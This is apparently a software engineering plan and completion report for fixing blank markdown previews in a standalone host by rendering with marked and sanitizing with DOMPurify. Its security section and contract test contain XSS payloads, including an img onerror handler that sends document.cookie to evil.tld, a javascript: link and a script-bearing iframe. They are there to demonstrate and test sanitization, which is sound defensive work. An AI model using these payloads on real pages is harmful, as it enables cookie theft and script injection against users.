# Fix kanban plan preview dead in standalone — markdown.api.render unbridged

## Goal

Register the `markdown.api.render` command in the standalone host so clicking a kanban plan in the project panel renders its preview instead of showing a blank pane. The command is a VS Code built-in that returns `undefined` in `npx switchboard`, breaking 35 call sites across 7 provider files.

### Problem Analysis

**Symptom.** In `npx switchboard`, the project panel's Kanban tab lists plans correctly (the `fetchKanbanPlans` verb works — it reads the DB directly, no markdown rendering). Clicking a plan item sends `fetchKanbanPlanPreview`, which reaches `_handleFetchKanbanPlanPreview` (`PlanningPanelProvider.ts:1712`). That handler reads the plan file, then calls:

```ts
const renderedHtml = await this._seams().commands.executeCommand<string>('markdown.api.render', content);
```

In the standalone host, `markdown.api.render` is not registered. The headless seams (`createVscodeHostSeams`, `bootstrap.ts:1066`) are registry-first (`bootstrap.ts:1215–1217`): a registered command executes in-process; an unregistered one falls through to `vscodeShim.executeCommand`, which warns once and returns `undefined` (`vscodeShim.ts:394–400`). It does NOT throw.

So `renderedHtml` is `undefined`. The payload sent to the browser has `content: undefined` and `rawContent: <the raw markdown>`. The browser handler (`project.js:631`) does:

```js
kanbanPreviewContent.innerHTML = externalizeAnchors(msg.content || '');
```

`undefined || ''` → empty string. The preview pane goes blank. The user sees "clicking does nothing."

**Root cause.** `markdown.api.render` is a VS Code built-in command that renders markdown to sanitized HTML using VS Code's markdown engine. The standalone host has no VS Code, so the command does not exist. `bootstrap.ts` registers standalone handlers for other unbridged commands (`switchboard.refreshUI`, `switchboard.importPlanFromClipboard`, `vscode.open`, etc. at `:1219+`), but `markdown.api.render` was never bridged. This is the same composition-root class as the sixteen-seam plan: a capability the extension host has that the standalone host silently lacks, with no compile error, no runtime error, and no test failure — just a blank pane.

**Scope of the break — corrected.** There are 11 `executeCommand('markdown.api.render', ...)` invocations across 5 provider files (the "35" figure counts grep matches including comments, test mocks, and webview string literals). These split into two populations with **opposite** standalone behavior:

> **Superseded:** 35 call sites across 7 files; all are broken in standalone.
> **Reason:** Code reading of every consumer handler shows the ticket and live-preview paths already render via a client-side `renderMarkdown` fallback when the host returns `undefined`/`''`. Only the project-panel preview paths go blank. The "all broken" framing inflated the blast radius 3x and hid a behavior-change surface (see "Behavior Change for Currently-Working Paths" below).
> **Replaced with:** the two-population breakdown below.

**Population 1 — truly broken in standalone (no client-side fallback; blank / empty-state / escaped-plaintext):**

| File:line | Path | Standalone symptom |
| :--- | :--- | :--- |
| `PlanningPanelProvider.ts:1763` | Kanban plan preview | Blank — `project.js:631` does `externalizeAnchors(msg.content \|\| '')` |
| `PlanningPanelProvider.ts:3747` | Archived plan detail | "Preview unavailable on this host." empty state (`project.js:746-758`) |
| `PlanningPanelProvider.ts:4359` | Constitution preview | Blank — `project.js:1012` does `externalizeAnchors(msg.renderedHtml \|\| '')` |
| `PlanningPanelProvider.ts:4489` | PRD preview | Blank — `project.js` `projectPrdContent` handler consumes `content: renderedHtml` |
| `PlanningPanelProvider.ts:5433` | Insight preview | Escaped plaintext — `project.js:1160` falls back to `escapeHtml(msg.content)` |
| `DesignPanelProvider.ts:2501` | Design live preview | Blank — sends `html` only, no `markdown` source field for a client fallback |

These 6 call sites are the real break. The kanban plan preview is the most visible because it is the first thing a user clicks in the project panel.

**Population 2 — NOT broken (working client-side fallback; renders today):**

| File:line | Path | Why it works today |
| :--- | :--- | :--- |
| `TaskViewerProvider.ts:13926, 14332` | Ticket description (TaskViewer) | `tickets.js:7689,7722`: `renderedDescriptionHtml: message.renderedDescriptionHtml \|\| renderMarkdown(_linearSrc)` — the `\|\|` fires when the host returns `''` |
| `TicketsPanelProvider.ts:2511, 2577` | Ticket description (TicketsPanel) | Same `tickets.js` fallback arm |
| `sharedUtilityVerbs.ts:104` | `renderMarkdownLive` (edit-mode live preview) | Sends `markdown: content` source field alongside `html`; the webview renders from `markdown` when `html` is undefined (documented at `sharedUtilityVerbs.ts:120-124`) |

These 5 call sites already render correctly in standalone via the hand-rolled `renderMarkdown` in `sharedUtils.js:122`. **Registering `markdown.api.render` will change their rendering engine** from `renderMarkdown` to `marked` — see "Behavior Change for Currently-Working Paths" below.

**Why the list works but the preview doesn't.** `fetchKanbanPlans` (`PlanningPanelProvider.ts:3777`) reads plans from `KanbanDatabase.forWorkspace(root).getBoard(workspaceId)` and sends the raw records to the browser. No markdown rendering — the plan `topic` is a plain string from the DB. The preview path reads the plan FILE (`.md`) and renders it to HTML, which is where `markdown.api.render` is called.

### Root Cause

`markdown.api.render` is a VS Code built-in. The standalone host's command seam is registry-first (`bootstrap.ts:1215–1217`): registered commands execute in-process; unregistered ones fall through to `vscodeShim.executeCommand`, which returns `undefined` with a warn-once. The command was never registered in `bootstrap.ts`, so every call site gets `undefined` and degrades to empty output. The existing client-side `renderMarkdown` in `sharedUtils.js:122` is a hand-rolled renderer used only in the browser's live-edit preview fallback — the server-side preview path has no fallback.

## Metadata

**Complexity:** 4
**Tags:** backend, bugfix, standalone, ui

## User Review Required

None. All three previously-open items are resolved below.

**Resolved — `marked` as a direct dependency.** Accepted. `marked` v16.4.2 is already in `node_modules` as a transitive dependency via `mermaid@11.14.0`; `npm add marked` pins it directly so it cannot vanish if the transitive edge is dropped. The alternative (extracting the hand-rolled `renderMarkdown` from `sharedUtils.js` into a shared module) is rejected: dependency-free, but no GFM tables and no syntax highlighting.

**Resolved — engine swap for the 5 currently-working ticket paths.** Accepted as parity-improving. The visual-delta review at Verification Plan step 10 is mandatory, not optional.

**Resolved — HTML sanitization.** Sanitize. `DOMPurify` is added to the standalone `markdown.api.render` handler. The open question rested on three premises that are all false at HEAD — see **Security** under Edge-Case & Dependency Audit for the measurements. Summary: `dompurify` and `jsdom` are already direct `dependencies` and `jsdom` is already loaded at runtime, so the marginal install cost is zero; and the CSP does *not* block the vector that `innerHTML` injection actually uses.

## Approach

1. **Register `markdown.api.render` in `bootstrap.ts`.** Add a `switchboardCommandRegistry.register('markdown.api.render', ...)` call alongside the existing standalone command registrations (`:1219+`). The handler takes a markdown string and returns rendered HTML using `marked` (already in `node_modules`, to be added as a direct dependency).

2. **Add `marked` as a direct dependency.** Run `npm add marked`. It is already present as a transitive dependency — adding it as a direct dependency prevents it from disappearing if the transitive dependency is removed. Prefer a version published at least 7 days ago.

3. **Sanitize the output with `DOMPurify`.** `marked` v16 does not sanitize — the `sanitize` option was removed in v0.8 and no longer exists; do not attempt to configure it. Wrap `marked.parse(...)` in `DOMPurify.sanitize(...)` inside the standalone handler. `dompurify` and `jsdom` are already direct dependencies (`package.json`) and require no `npm add`. Construct **one** `JSDOM` window at module scope and reuse it across renders — do not build a window per call. This restores host parity: the extension host sanitizes via VS Code's renderer, the standalone host sanitizes via DOMPurify.

## Complexity Audit

### Routine

- Registering a command in `switchboardCommandRegistry` — one line, same pattern as the 10+ existing registrations in `bootstrap.ts:1219+`.
- Adding `marked` as a direct dependency — one `npm add` command.
- The handler body: `DOMPurify.sanitize(marked.parse(content || ''))`, wrapped in try/catch returning `''`. `dompurify` and `jsdom` are already direct dependencies — no `npm add` for either.

### Complex / Risky

- **Rendering fidelity.** VS Code's markdown renderer and `marked` produce different HTML. VS Code adds CSS classes (`code-line`, `hljs`), wraps blocks in specific containers, and handles VS Code-specific extensions (e.g. command links). `marked` produces standard GFM HTML. The webview CSS may style VS Code's output differently than `marked`'s output. Verify the preview renders readably — it does not need to be pixel-identical, but code blocks, tables, and links must be legible.
- **11 call sites, one registration — two populations.** Registering the command fixes the 6 broken project-panel paths at once AND silently swaps the rendering engine for the 5 currently-working ticket/live-preview paths (which today use the hand-rolled `renderMarkdown` fallback). The strength is one-change leverage; the risk is that the engine swap changes the HTML structure for ticket descriptions, where the webview CSS was tuned against `renderMarkdown`'s output. The consumers all use the HTML as `innerHTML` after `externalizeAnchors`, so the contract is "valid HTML string" — `marked` satisfies it — but "valid" is not "visually identical." A visual-delta review of ticket descriptions in standalone is required, not optional.

## Edge-Case & Dependency Audit

**Race Conditions.** None. The command registration runs at bootstrap, before any provider handles a message. The registry is synchronous.

**Security.** Sanitization is required, and the standalone handler must wrap `marked.parse(...)` in `DOMPurify.sanitize(...)`.

> **Superseded:** "Add `DOMPurify` (not currently a dependency) to the handler pipeline, or accept the CSP as sufficient. Flagged for user decision."
> **Reason:** all three premises of that open question are false at HEAD. (1) `dompurify ^3.3.1` and `jsdom ^28.0.0` are already in `package.json` **`dependencies`** (with `@types` for both), already installed (852K + 5.1M), and `jsdom` is already loaded at runtime by `TaskViewerProvider.ts:22527` (`require('jsdom').JSDOM` in `_convertHtmlToMarkdown`) — so the marginal install cost of sanitizing is **zero**, not "a heavy new dep". (2) The CSP does not block the vector that matters. (3) The asymmetry runs the *other* way — standalone is currently **stricter** than the extension, so this change is a net regression on the 5 working paths, not a neutral gap.
> **Replaced with:** the measured analysis below. The decision is resolved; it is no longer a user decision.

**The `<script>` threat model is the wrong one.** HTML injected via `innerHTML` never executes `<script>` tags — that is the HTML spec, not CSP. Every consumer here is an `innerHTML` sink (`project.js:631,1012,1160`, `planning.js:3539,5131,6192`, `design.js:1661`). The vector that *does* work through `innerHTML` is the event-handler attribute.

**The CSP permits exactly that vector.** The standalone project panel's policy (`src/services/headlessPanelHtml.ts:275`, and identically at `:311` planning / `:347` design; mirrored in `project.html:6`, `planning.html:6`, `design.html:6`) is:

```
default-src 'none'; script-src 'nonce-…' 'self' 'unsafe-eval'; script-src-attr 'unsafe-inline'; … frame-src 'self' http: https: about:srcdoc blob: data:;
```

`script-src-attr` carries **no nonce**, so its `'unsafe-inline'` is honored and inline event handler attributes execute. The CSP blocks the vector that was already dead and permits the live one. `externalizeAnchors` (`sharedUtils.js:62`) only appends `target`/`rel` — it strips nothing and does not touch `javascript:` hrefs. So the CSP is not a sufficient barrier, and it is not the only thing standing between untrusted markdown and script execution today — the *renderer* is.

**Today standalone escapes everything.** The hand-rolled `renderMarkdown` escapes `&`, `<`, `>` up front (`sharedUtils.js:126-129`), so no HTML survives at all. Measured on the same payload through both renderers:

```
hand-rolled (today):  &lt;img src=x onerror="fetch('https://evil.tld/?c='+document.cookie)"&gt;
                      <a href="#" target="_blank" rel="noopener noreferrer">click</a>   ← javascript: neutralised

marked v16 (raw):     <img src=x onerror="fetch('https://evil.tld/?c='+document.cookie)">
                      <p><a href="javascript:alert(3)">click</a></p>
                      <iframe src="data:text/html,<script>alert(4)</script>"></iframe>
```

Unsanitized, this plan moves the 5 currently-working ticket/live-preview paths (Population 2) from *escape-everything* to *pass-everything-through*, onto panels whose CSP permits event handlers. The content is not fully trusted: ticket descriptions come from the integration sync APIs and plan files are imported from shared workspaces.

**`marked.parse` + `DOMPurify.sanitize` is verified to close it without losing fidelity.** Measured on the payload above plus rich markdown: `onerror`, `onload`, `javascript:`, `<script`, `<iframe` all stripped; `<h1>`, GFM `<table>` with `align` attributes, `<pre><code class="language-ts">`, `<li>`, `<strong>`, `<em>`, and `href="https://example.com"` all preserved. Throughput with one reused module-scope window: 200 render+sanitize cycles in 547ms (~2.7ms each) — immaterial for preview rendering.

**Why the handler and not the webview.** Sanitizing browser-side at the `innerHTML` sinks would cover both hosts from one place, but it requires shipping `purify.min.js` as a static asset through webpack's copy step, a `/static` route, and script tags in four panel HTML files — and the extension host is already sanitized by VS Code's renderer, so the marginal benefit is small. Sanitizing in the standalone handler is ~5 lines in one file, adds no dependency, and closes the asymmetry exactly where it exists. Browser-side sanitization at the sinks remains the better long-term shape if `script-src-attr 'unsafe-inline'` is ever kept deliberately.

**Out of scope, worth its own plan.** `script-src-attr 'unsafe-inline'` appears tightenable — there are only 3 inline handler attributes across `project.html`, `planning.html`, `design.html`, `project.js`, `planning.js`. Removing it would harden every `innerHTML` sink in both hosts. Do not attempt it in this plan.

**Side Effects.** Registering the command has two effects: (1) the 6 broken project-panel preview paths start producing rendered HTML where there were blank panes / empty states / escaped plaintext — this is the fix; (2) the 5 currently-working ticket/live-preview paths stop using their `renderMarkdown` fallback and start consuming `marked` HTML — a rendering-engine swap with no code change in those paths. The first run after this change will show previews where there were blank panes, AND ticket descriptions may look different (different HTML structure). No persisted state changes.

A third effect follows from sanitization: raw HTML embedded in a plan file or ticket description is now **stripped** rather than escaped-and-shown (`renderMarkdown`'s behavior) or executed (`marked` raw). A plan file that deliberately embeds an `<iframe>` or a styled `<div>` will lose it. This is intended — the content is not fully trusted — but it is a visible difference from both the before state and from unsanitized `marked`.

**Dependencies & Conflicts.** `marked` is already in `node_modules` as a transitive dependency. Adding it as a direct dependency prevents silent removal. No conflict with existing dependencies. Independent of the sixteen-seam wiring plan — either can ship first.

## Dependencies

- Independent of the sixteen-seam `LocalApiServer` wiring plan. Either can ship first; this plan fixes the preview, that plan fixes the action routes.
- `marked` must be added as a direct dependency before the command registration can use it.
- `dompurify` and `jsdom` need no action — both are already direct `dependencies`, both are already installed, and `jsdom` is already required at runtime (`TaskViewerProvider.ts:22527`).

## Adversarial Synthesis

Key risks: (1) `marked`'s HTML output differs from VS Code's renderer in CSS class names and block structure — the preview may render but look different (code blocks, tables); (2) **unsanitized `marked` output is a live XSS regression, not a theoretical gap** — `marked` v16 does not sanitize (the `sanitize` option was removed in v0.8), the panels' CSP carries `script-src-attr 'unsafe-inline'` with no nonce so inline event handlers execute, and the 5 currently-working paths would move from *escape-everything* to *pass-everything-through*; (3) the registration silently swaps the rendering engine for those 5 paths from the hand-rolled `renderMarkdown` to `marked` — a behavior change with no code diff, where the webview CSS was tuned against `renderMarkdown`'s output.

Mitigations: verify rendering in the browser project panel after wiring; **wrap the handler output in `DOMPurify.sanitize` — this is decided, not optional, and `dompurify`/`jsdom` are already dependencies**; perform a visual-delta review of ticket descriptions and live preview in standalone to catch the engine-swap regression.

The residual risk after sanitizing is fidelity, not security: DOMPurify's default allowlist could strip something the webview CSS expects. Measured against GFM tables (with `align`), fenced code (with `language-*` class), lists, links, `<strong>`/`<em>` — all preserved. If a future renderer feature needs a tag DOMPurify drops, widen the allowlist explicitly; do not disable sanitization.

## Proposed Changes

### `src/standalone/bootstrap.ts` (command registration, near `:1219+`)

**Context.** The standalone host registers handlers for unbridged VS Code commands into `switchboardCommandRegistry`. `markdown.api.render` is missing.

**Logic.** Add after the existing `switchboardCommandRegistry.register(...)` block:

```ts
// markdown.api.render — VS Code built-in that renders markdown to HTML.
// Unbridged, every preview pane in the standalone host gets undefined and
// shows a blank pane. Uses `marked` (GFM) as the standalone renderer.
// The headless seams are registry-first (hostSeams.ts:327-336), so this
// registration intercepts the call before vscodeShim's warn-and-return-undefined.
//
// DOMPurify is NOT optional here. VS Code's markdown.api.render sanitizes;
// `marked` does not (its `sanitize` option was removed in v0.8 — do not try to
// set it). Every consumer assigns this string to innerHTML, and the panel CSP
// carries `script-src-attr 'unsafe-inline'` with no nonce, so inline event
// handlers (`<img src=x onerror=...>`) would execute. See the plan's Security
// section. One JSDOM window is built at module scope and reused — building one
// per render is the expensive mistake.
switchboardCommandRegistry.register('markdown.api.render', (content: string) => {
    try {
        return markdownPurifier.sanitize(marked.parse(content || '') as string);
    } catch {
        return '';
    }
});
```

At module scope in `bootstrap.ts`, alongside the imports:

```ts
import { marked } from 'marked';
import { JSDOM } from 'jsdom';
import createDOMPurify from 'dompurify';

// One window, reused for every render. `jsdom` is already loaded at runtime by
// TaskViewerProvider's clipboard HTML->markdown path, so this adds no new weight.
const markdownPurifier = createDOMPurify(new JSDOM('').window as unknown as Window);
```

**Edge Cases.** The handler must not throw — `vscodeShim.executeCommand` never throws (it returns `undefined`), and the callers use `|| ''` or `?? ''` to handle undefined. A throw would become an unhandled rejection in the caller's async path. Wrap in try/catch returning `''` on failure.

### `package.json` (direct dependency)

**Logic.** Add `marked` as a direct dependency via `npm add marked`. It is already present as a transitive dependency (via `mermaid@11.14.0`) — this prevents silent removal.

**No other dependency change.** `dompurify ^3.3.1`, `jsdom ^28.0.0`, `@types/dompurify` and `@types/jsdom` are already in `dependencies`. Do not add them again, and do not add `isomorphic-dompurify`. Note that `dompurify` is currently declared but referenced nowhere in `src/` — this plan makes it a real dependency rather than a phantom one.

### No code changes to provider files — but a behavior change for 5 paths

The 11 `executeCommand` call sites are unchanged in code. They already call `this._seams().commands.executeCommand<string>('markdown.api.render', content)` and handle `undefined` with `|| ''` or `?? ''`. Once the command is registered, they get real HTML instead of `undefined`. No provider-level code change is needed.

**Behavior Change for Currently-Working Paths.** The 5 ticket/live-preview call sites (Population 2 above) currently render via a client-side `renderMarkdown` fallback because the host returns `''`. Once `markdown.api.render` returns `marked` HTML:

- `tickets.js:7689, 7722`: `message.renderedDescriptionHtml` is no longer `''`, so the `|| renderMarkdown(_linearSrc)` fallback **stops firing**. Ticket descriptions render through `marked` instead of the hand-rolled `renderMarkdown`.
- `sharedUtilityVerbs.ts:104`: the `html` field is no longer `undefined`. The webview paths that rendered from the `markdown` source field will now consume `marked` HTML directly.

This is an engine swap, not a code change. The HTML structure differs (`marked` emits standard GFM; `renderMarkdown` emits hand-rolled HTML the webview CSS was tuned against). **A visual-delta review of ticket descriptions and the edit-mode live preview in standalone is mandatory** — see Verification Plan step 10. The existing test `tickets-description-markdown-fallback.test.js` asserts the fallback *exists* and is *documented*; it does not assert the fallback *fires* in standalone, so it will not catch this swap. The test `sharedUtils-renderMarkdown.test.js:335` asserts `pushes[0].html === undefined` in the standalone-mock case — that test mocks the seam directly and does not go through `bootstrap.ts`, so it is unaffected by the registration, but its premise (undefined in standalone) no longer holds in the real host.

## Verification Plan

### Automated Tests

1. **Reproduce first.** In `npx switchboard`, open the project panel, go to the Kanban tab, click a plan. Confirm the preview pane shows nothing (blank or "Loading preview..." that never resolves).
2. **After wiring**, click the same plan. Confirm the preview pane renders the plan's markdown content as HTML (headings, code blocks, lists, tables legible).
3. **Constitution preview.** In the project panel's Constitution tab, confirm the constitution file renders as HTML (not blank).
4. **Archived plan detail + Insight preview.** In the Archives tab, confirm an archived plan renders as HTML (not the "Preview unavailable on this host." empty state). In the Tuning tab, confirm an insight renders as HTML (not escaped plaintext).
5. **Edit-mode live preview.** Enter edit mode on a kanban plan, confirm the live preview pane renders as you type (the `renderMarkdownLive` path, `sharedUtilityVerbs.ts:104`).
6. `npm run compile` and `tsc` clean; `npm run test:contract:verb-engine` green (the `renderMarkdownLive` test at `verb-engine-planning-headless.test.js:283` mocks `markdown.api.render` — confirm it still passes with the real registration).
7. **Both hosts, same preview.** Open the same plan in the extension host and the standalone host; confirm both render the preview (not pixel-identical, but both legible).
8. **Sanitization contract test (automated, required).** Add a contract test that calls the registered `markdown.api.render` handler directly with a hostile payload and asserts the output. Negative assertions: the result contains none of `onerror`, `onload`, `javascript:`, `<script`, `<iframe`. Paired positive assertions on the same render: `<h1>`, `<table`, `<code`, `<li>`, `<strong>`, and `href="https://example.com"` all survive — the test must fail if sanitization is implemented by stripping everything. Payload to use:

```
# Ticket

<img src=x onerror="fetch('https://evil.tld/?c='+document.cookie)">

<svg onload="alert(1)"></svg>

<script>alert(2)</script>

[click](javascript:alert(3))

<iframe src="data:text/html,<script>alert(4)</script>"></iframe>

| a | b |
| :-- | --: |
| 1 | 2 |
```

9. **One window, not one per render.** Assert (by code reading or by a spy on the `JSDOM` constructor) that `bootstrap.ts` constructs its `JSDOM` window exactly once at module scope, not inside the handler. A per-call window is functionally correct and ~100x slower — no test catches it otherwise.

10. **Visual-delta review of ticket descriptions (engine-swap regression check).** In `npx switchboard`, open the Tickets panel, select a Linear issue and a ClickUp task with rich descriptions (tables, code blocks, lists). Compare the rendered description BEFORE this change (rendered via the hand-rolled `renderMarkdown` fallback) and AFTER (rendered via `marked`). Confirm the description is legible and not visually broken — code blocks, tables, and lists must render. This is the check that catches the silent engine swap for the 5 currently-working paths. If the output is visually broken, the webview CSS needs adjustment for `marked`'s HTML structure (out of scope for this plan — flag back).

### Goal Invariants

- **Positive:** `switchboardCommandRegistry.has('markdown.api.render')` returns `true` in the standalone host (asserted by inspecting `switchboardCommandRegistry.registeredCommands` after bootstrap).
- **Positive:** `await headlessSeams.commands.executeCommand('markdown.api.render', '# Hello')` returns a string containing `<h1>` in the standalone host (asserted by a unit test or manual REPL check).
- **Positive:** `await headlessSeams.commands.executeCommand('markdown.api.render', '<img src=x onerror="alert(1)">')` returns a string containing neither `onerror` nor `javascript:` in the standalone host.
- **Negative (paired):** sanitization does not gut the renderer — the same handler, given a GFM table and a fenced code block, still returns `<table` and `<code`. A handler that returns escaped or empty output for all HTML fails this pair even though it passes the security assertion.
- **Negative (paired):** no call site in `PlanningPanelProvider.ts`, `TaskViewerProvider.ts`, `TicketsPanelProvider.ts`, `DesignPanelProvider.ts`, or `sharedUtilityVerbs.ts` was modified to add a client-side fallback. Paired positive: the single command registration fixes the 6 broken project-panel paths without touching provider code.

## Completion Summary

Implemented: registered `markdown.api.render` in `src/standalone/bootstrap.ts` as a `switchboardCommandRegistry` handler that renders markdown via `marked` and sanitizes via `DOMPurify` (one module-scope `JSDOM` window reused across renders), fixing the 6 blank/empty-state/escaped-plaintext project-panel preview paths without touching any provider code. Added `marked@^16.4.2` as a direct dependency (`npm add marked`); `dompurify` and `jsdom` were already direct deps. Added a sanitization contract test (`src/test/markdown-render-sanitize-contract.test.js`, 21 assertions: source-text wiring checks + a behavioral run of the exact `createDOMPurify(new JSDOM('').window).sanitize(marked(...))` pipeline against a hostile payload) and wired it as `npm run test:contract:markdown-render`.

Two deviations from the plan's Proposed Changes, both required for the project's tsconfig (CommonJS, no `esModuleInterop`): (1) the dompurify import is `import createDOMPurify = require('dompurify')` not a default import — dompurify's bundled types use `export =`, matching the existing `import JSZip = require('jszip')` convention; (2) the handler calls `marked(content || '')` not `marked.parse(...)` — `marked` is declared as a function in marked.d.ts and `parse` is a separate export not exposed as a property on the `marked` function type (`marked.parse === marked` at runtime). The contract test passes 21/21. Per run directives, compilation and the broader test suite were not executed; the visual-delta review of ticket descriptions (Verification Plan step 10) remains a manual check for the user.

## Review Findings

Files changed in this pass: `src/standalone/bootstrap.ts` (marked loaded via an eager dynamic `import()` instead of a static ESM import; DOMPurify window moved behind a lazy module-scope memo with a correctly-typed cast), `src/test/markdown-render-sanitize-contract.test.js` (assertions retargeted, `marked` loaded by dynamic import so the test is Node-version independent), `.github/workflows/integration-tests.yml` (the contract test is now invoked by CI). Two CRITICAL compile errors were shipped: the plan's prescribed `import { marked } from 'marked'` is TS1479 under `module: Node16` (marked v16 is ESM-only) and its prescribed `as unknown as Window` cast is TS2345 against dompurify's `WindowLike` — both fixed, and `tsc --noEmit` is now clean for `bootstrap.ts` (12 unrelated errors remain at HEAD in `KanbanProvider.ts`/`TaskViewerProvider.ts`/`teamWiring.ts`/`ClickUpSyncService.ts`/`NotionFetchService.ts`, none from this work). Validation: contract test 22/22 green, `test:contract:rendermarkdown`, `test:contract:tickets-description-fallback`, `test:contract:verb-engine-planning` (32/32), `test:contract:verb-engine-kanban` (19/19) and `standalone-parity:check` all green; a standalone webpack build confirms `marked` is inlined into `cli.js` with no new async chunk and the registration survives bundling (`test:contract:verb-engine` fails at HEAD on an unrelated `vscode.workspace` trap in `TaskViewerProvider`, against an `out/` predating this work). Remaining risk is fidelity, not security: the end-to-end render (Verification Plan steps 1–5, 7, 10) is manual browser UAT that this pass did not execute, so the passing suites are evidence the handler renders and sanitizes correctly — not evidence that a preview pane paints in `npx switchboard`.

## Deferred Findings

- MAJOR — end-to-end preview render unverified. No automated check discriminates on the core mechanism (bootstrap registration reached → headless seam → panel payload → `innerHTML`); the contract test asserts source text plus a re-implementation of the pipeline. Verification Plan steps 1–5 and 7 remain manual. `src/standalone/bootstrap.ts:1349`
- MAJOR — engine-swap visual delta for Population 2 not reviewed (Verification Plan step 10). Ticket descriptions now render through `marked` instead of the hand-rolled `renderMarkdown` fallback, with no code change at the call sites and no gate that fires on a CSS mismatch. `src/webview/tickets.js:7689`
- NIT — the contract test cannot exercise the real registration (booting `startHeadlessSwitchboard` in a unit test starts an HTTP server, PTY fleet and watchers). Its wiring half is regex-over-source and will drift if the handler is refactored. `src/test/markdown-render-sanitize-contract.test.js:127`
- NIT — `@types/jsdom` is pinned `^27.0.0` while `jsdom` is `^28.0.0`; masked by `skipLibCheck: true`. Pre-existing, not introduced here. `package.json:1068`
- NIT — sanitization strips raw HTML that a plan file or ticket description embeds deliberately (a styled `<div>`, an `<iframe>`); previously it was escaped and visible. Intended per the plan's Side Effects, but it is a visible behaviour change. `src/standalone/bootstrap.ts:1349`
- NIT — `npm add marked` also re-sorted the `@xterm/*` dependency block in `package.json`. Cosmetic churn in a shared file; left as npm produced it. `package.json:1072`
